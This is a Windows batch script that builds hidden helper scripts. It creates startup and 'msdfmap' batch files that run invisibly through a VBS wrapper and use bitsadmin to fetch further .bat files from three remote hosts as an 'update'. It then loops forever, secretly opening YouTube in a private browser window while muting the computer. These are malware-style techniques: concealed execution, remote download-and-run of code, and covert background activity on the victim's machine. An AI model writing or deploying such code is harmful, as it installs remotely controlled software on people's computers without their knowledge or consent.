@echo off



REM Create Mute.VBS to bring the volume down to 0


















REM Create Startup.bat to run the msdfmap.bat and startup_copier invisibly. The output will produce Startup.bat with the following code inside.
REM @echo off 
REM wscript.exe C:\Users\Popeye\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\Popeye\AppData\Roaming\Microsoft\msdfmap.bat 
REM wscript.exe C:\Users\Popeye\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\Popeye\AppData\Roaming\System32\startup_copier.bat 
type NUL > C:\Users\%username%\Desktop\startup.bat
ECHO @echo off >> C:\Users\%username%\Desktop\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat >> C:\Users\%username%\Desktop\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat >> C:\Users\%username%\Desktop\startup.bat








REM This builds the code for msdfmap.bat
REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
type NUL > C:\Users\%username%\Desktop\msdfmap.bat
ECHO @echo off >> C:\Users\%username%\Desktop\msdfmap.bat
REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
ECHO IF EXIST "C:\Users\%username%\Desktop\downloadtest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO 	echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO 	bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/bnichs5/testwebsite/master/downloadtest.bat" "C:\Users\%username%\Desktop\downloadtest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO )	 >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Desktop\downloadtest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/w1672993/testwebsite/downloads/downloadtest.bat" "C:\Users\%username%\Desktop\downloadtest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Desktop\htmltest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/htmltest.bat" "C:\Users\%username%\Desktop\htmltest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) >> C:\Users\%username%\Desktop\msdfmap.bat
REM Adds "Starts the Startup_Copier.bat script" to msdfmap.bat
ECHO start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat >> C:\Users\%username%\Desktop\msdfmap.bat
REM The below code loops opening the youtube every 4 minutes. Closes youtube after 35 seconds. Also mutes computer for 35 seconds.
ECHO :loop >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ping -n 205 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO start /min iexplore -private http://youtube.com >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO start C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO taskkill /f /im C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ping -n 35 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat 
ECHO goto loop >> C:\Users\%username%\Desktop\msdfmap.bat










